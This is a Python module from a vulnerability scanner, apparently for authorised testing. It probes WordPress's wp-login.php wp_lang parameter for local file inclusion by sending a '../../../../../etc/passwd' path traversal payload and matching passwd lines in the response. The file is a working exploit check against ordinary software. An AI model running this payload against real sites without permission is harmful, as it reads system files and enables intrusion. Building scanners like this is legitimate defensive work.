# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""WordPress wp_lang LFI - Path Traversal di wp-login.php."""

import re
import requests
import urllib3

from ._base import cve_module

urllib3.disable_warnings()


@cve_module(
    cve_id="CVE-WP-LFI-WPLANG",
    name="WordPress wp_lang LFI (wp-login.php)",
    severity="high",
    requires=["wordpress"],
    timeout=10,
    description="Path traversal di parameter wp_lang",
    aggressive=False,
)
def test(url, timeout=10, oast_url=None, **kwargs):
    base = url.rstrip("/")
    payload = "../../../../../etc/passwd"

    try:
        r = requests.get(f"{base}/wp-login.php",
                         params={"wp_lang": payload},
                         timeout=timeout, verify=False)
        if r.status_code != 200:
            return {"status": "not_vulnerable",
                    "details": f"HTTP {r.status_code}"}

        if re.search(r'root:[x*]?:0:0:[^:]*:/[^:]*:/[^\s]+', r.text):
            return {
                "status": "vulnerable",
                "details": "LFI: /etc/passwd readable",
                "evidence": "Full /etc/passwd line detected",
                "endpoint": "/wp-login.php?wp_lang=../../...",
                "poc_url": f"{base}/wp-login.php?wp_lang={payload}",
            }

        if "root:x:0:0:" in r.text or "daemon:" in r.text:
            return {
                "status": "potential",
                "details": "Marker /etc/passwd found but partial",
                "evidence": "Marker found",
            }

        return {"status": "not_vulnerable",
                "details": "wp_lang tidak vulnerable"}
    except Exception as e:
        return {"status": "error", "details": type(e).__name__}
